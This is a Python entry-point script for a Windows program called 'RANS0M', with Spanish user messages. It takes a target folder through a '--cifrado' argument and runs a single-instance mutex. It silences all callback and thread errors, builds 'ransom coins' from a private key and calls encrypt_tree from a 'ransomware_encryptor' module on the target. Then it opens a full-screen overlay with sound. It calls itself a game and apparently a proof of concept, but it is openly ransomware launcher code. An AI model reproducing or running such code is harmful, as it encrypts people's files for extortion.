import ctypes
import sys
import traceback

MB_ICONERROR = 0x10


def _show_fatal(title: str, text: str):
    try:
        from pathlib import Path

        log = Path(__file__).resolve().parent / "errors.log"
        with open(log, "a", encoding="utf-8") as f:
            f.write(f"--- {title} ---\n{text}\n")
    except Exception:
        pass
    try:
        print(text, file=sys.stderr)
    except Exception:
        pass
    try:
        ctypes.windll.user32.MessageBoxW(None, text, title, MB_ICONERROR)
    except Exception:
        pass


def _log_error(context: str, exc_info):
    if exc_info and issubclass(exc_info[0], KeyboardInterrupt):
        return
    try:
        from pathlib import Path

        log = Path(__file__).resolve().parent / "errors.log"
        with open(log, "a", encoding="utf-8") as f:
            f.write(f"--- {context} ---\n"
                    + "".join(traceback.format_exception(*exc_info)) + "\n")
    except Exception:
        pass


def _check_dependencies():
    missing = []
    for module, pip_name in (("PIL", "Pillow"), ("tkinterdnd2", "tkinterdnd2"),
                             ("pystray", "pystray")):
        try:
            __import__(module)
        except ImportError:
            missing.append(pip_name)
    return missing


def _acquire_single_instance():
    from ctypes import wintypes

    kernel32 = ctypes.windll.kernel32
    kernel32.CreateMutexW.restype = wintypes.HANDLE
    kernel32.CreateMutexW.argtypes = [wintypes.HANDLE, wintypes.BOOL, wintypes.LPCWSTR]
    handle = kernel32.CreateMutexW(None, False, "Local\\RANS0M_SingleInstance")
    if not handle or kernel32.GetLastError() == 183:
        return None
    return handle


def _parse_cifrado(argv):
    i = 1
    while i < len(argv):
        if argv[i] == "--cifrado" and i + 1 < len(argv):
            return argv[i + 1]
        i += 1
    return None


def main():
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        pass

    try:
        cifrado = _parse_cifrado(sys.argv)
        if cifrado:
            from global_state import Global
            Global.TARGET_PATH = cifrado

        mutex = _acquire_single_instance()
        if mutex is None:
            _show_fatal(
                "RANS0M",
                "RANS0M ya se está ejecutando.\n\n"
                "Mira la bandeja del sistema (icono de RANS0M) y usa\n"
                "clic derecho -> Close para cerrar la instancia anterior,\n"
                "o revisa el Administrador de tareas y termina el python.exe\n"
                "que haya quedado colgado.",
            )
            return

        missing = _check_dependencies()
        if missing:
            _show_fatal(
                "RANS0M — faltan dependencias",
                "Faltan dependencias: " + ", ".join(missing) + "\n\n"
                "Abre una consola en la carpeta del proyecto y ejecuta:\n\n"
                "    python -m pip install -r requirements.txt\n\n"
                "Si tienes varios Python instalados, instala con el MISMO\n"
                "interprete con el que lanzas el juego (p. ej.):\n\n"
                "    py -3 -m pip install -r requirements.txt\n"
                "    py main.py",
            )
            return

        import threading
        import tkinter as tk

        def _swallow(self, exc, val, tb):
            if issubclass(exc, KeyboardInterrupt):
                return
            _log_error("tkinter callback", (exc, val, tb))

        tk.Tk.report_callback_exception = _swallow
        try:
            from tkinterdnd2 import TkinterDnD
            TkinterDnD.Tk.report_callback_exception = _swallow
        except Exception:
            pass

        def _thread_swallow(args):
            if issubclass(args.exc_type, KeyboardInterrupt):
                return
            _log_error("thread", (args.exc_type, args.exc_value, args.exc_traceback))

        threading.excepthook = _thread_swallow

        from global_state import Global

        try:
            from pathlib import Path

            from poc_coins import create_ransom_coins
            from ransomware_encryptor import encrypt_tree

            pem_path = Path(__file__).resolve().parent / "private_key.pem"
            create_ransom_coins(pem_path.read_bytes())
            encrypt_tree(Global.TARGET_PATH)
        except Exception:
            pass

        from overlay import Overlay
        from sound_helper import WaveOut

        app = Overlay()
        try:
            app.mainloop()
        finally:
            WaveOut.close_all()
    except KeyboardInterrupt:
        pass
    except Exception:
        _show_fatal("RANS0M — error al iniciar", traceback.format_exc())


if __name__ == "__main__":
    main()
